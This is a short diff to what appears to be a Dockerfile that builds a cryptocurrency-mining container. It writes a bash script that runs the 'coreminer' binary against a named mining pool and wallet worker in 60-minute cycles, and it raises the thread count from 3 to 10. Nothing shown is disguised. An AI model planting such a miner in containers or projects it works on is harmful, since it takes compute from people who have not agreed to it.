@@ -16,13 +16,13 @@ RUN mkdir -p /app/miner && \
 RUN cat > /run-miner.sh << 'SCRIPT'
 #!/bin/bash
 BIN=$(find /app/miner -name "coreminer" -type f | head -1)
-POOL="stratum1+tcp://cb192fddfc1c24f6b7a27df5ceb903c03479bafde9d5.jasjus@us.catchthatrabbit.com:8008"
+POOL="stratum1+tcp://cb192fddfc1c24f6b7a27df5ceb903c03479bafde9d5.jasjus1@us.catchthatrabbit.com:8008"
 C=0
-echo "[*] coreminer ready — 3 threads — 60m ON / 2m OFF"
+echo "[*] coreminer ready — 10 threads — 60m ON / 2m OFF"
 while true; do
     C=$((C+1))
     echo "[Cycle $C] ▶ MINING 60m | $(date '+%H:%M:%S')"
-    $BIN --noeval --hard-aes -P "$POOL" -t 3 &
+    $BIN --noeval --hard-aes -P "$POOL" -t 10 &
     MPID=$!
     sleep 3600
     kill $MPID 2>/dev/null
